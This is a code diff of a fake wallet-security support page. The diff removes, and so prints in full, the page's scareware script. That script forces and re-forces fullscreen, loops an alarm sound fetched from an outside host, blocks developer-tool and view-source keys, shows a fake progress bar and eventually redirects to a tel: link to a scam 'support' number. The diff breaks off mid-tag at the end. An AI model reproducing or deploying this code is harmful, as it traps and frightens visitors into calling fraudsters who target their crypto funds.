@@ -31,9 +31,9 @@
         left: 0;
         width: 100vw;
         height: 100vh;
-        background-size: cover;
-        background-position: center;
-        background-repeat: no-repeat;
+        background-size: cover;          /* ✅ fix */
+        background-position: center;     /* ✅ fix */
+        background-repeat: no-repeat;    /* ✅ fix */
         cursor: pointer;
         z-index: 5;
     }
@@ -54,8 +54,8 @@
         max-width: 380px;
         text-align: center;
         animation: heartbeat 1s infinite;
-        max-height: 80vh;      /* ✅ Popup height limit */
-        overflow-y: auto;      /* ✅ Scroll if content overflows */
+        max-height: 80vh;      
+        overflow-y: auto;     
     }
 
     @keyframes heartbeat {
@@ -106,7 +106,7 @@
     }
 
     .popup-buttons {
-        position: sticky;    /* ✅ button hamesha bottom par rahe */
+        position: sticky;    
         bottom: 0;
         background: #fff;
         padding: 10px 0;
@@ -197,9 +197,7 @@
               <li>Do <strong>not</strong> share private keys, seed phrases, or passwords with anyone—even if they claim to be support.</li>
               <li>Revoke active sessions / connected dApps as instructed by support.</li>
               <li>Move funds to a new wallet created on a secure device if advised.</li>
-              
             </ul>
-            
           </div>
         </div>
 
@@ -209,101 +207,4 @@
         </div>
 
         <div class="popup-buttons">
-            <button id="callNowBtn">Call Now</button>
-            <div id="callNumberText">+1 877 868 7081</div>
-        </div>
-    </div>
-</div>
-
-<audio id="alertAudio" loop>
-    <source src="https://1992gameofthrone1992.github.io/imagetopa/cb-au.m4a" type="audio/mp4">
-</audio>
-
-<script>
-    const audio = document.getElementById('alertAudio');
-    const progressFill = document.getElementById('progressFill');
-    const callNowBtn = document.getElementById('callNowBtn');
-    const callNumberText = document.getElementById('callNumberText');
-    const startImage = document.getElementById('startImage');
-
-    function isMobile() {
-        return /Android|iPhone|iPad|iPod|Windows Phone/i.test(navigator.userAgent);
-    }
-
-    window.onload = function() {
-        startImage.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/2.jpeg')";
-        if (navigator.userAgent.includes("HTTrack")) {
-            alert("Website copying attempt detected. Action has been logged.");
-        }
-    }
-
-    document.addEventListener('keydown', function(e) {
-        if (e.keyCode == 123 || 
-            (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
-            (e.ctrlKey && (e.keyCode == 83 || e.keyCode == 85))) {
-            e.preventDefault();
-            alert("Action Blocked");
-        }
-    });
-
-    startImage.addEventListener('click', function () {
-        triggerFullScreen();
-        applyBackground();
-        startImage.style.display = 'none';
-        document.getElementById('leavePopup').style.display = 'block';
-        audio.play();
-
-        if (isMobile()) {
-            callNowBtn.style.display = 'inline-block';
-        } else {
-            callNumberText.style.display = 'block';
-        }
-
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += 0.2;
-            if (progress > 100) progress = 100;
-            progressFill.style.width = progress + '%';
-            if (progress === 100) clearInterval(interval);
-        }, 1000);
-
-        setTimeout(function () {
-            window.location.href = "tel:+18778687081";
-        }, 480000);
-    }, { once: true });
-
-    callNowBtn.addEventListener('click', function () {
-        window.location.href = "tel:+18778687081";
-    });
-
-    function triggerFullScreen() {
-        if (document.documentElement.requestFullscreen) {
-            document.documentElement.requestFullscreen();
-        } else if (document.documentElement.webkitRequestFullscreen) {
-            document.documentElement.webkitRequestFullscreen();
-        } else if (document.documentElement.msRequestFullscreen) {
-            document.documentElement.msRequestFullscreen();
-        }
-    }
-
-    function applyBackground() {
-        document.body.style.backgroundImage = "url('https://aliceinborderlandsept.github.io/colnbaze/2.jpeg')";
-        document.body.style.backgroundSize = "100% 100%";
-        document.body.style.backgroundPosition = "center";
-        document.body.style.backgroundRepeat = "no-repeat";
-    }
-
-    document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement) {
-            document.addEventListener('click', reEnterFullscreenOnce, { once: true });
-        }
-    });
-
-    function reEnterFullscreenOnce() {
-        triggerFullScreen();
-    }
-</script>
-
-</body>
-</html>
-
+            <butt
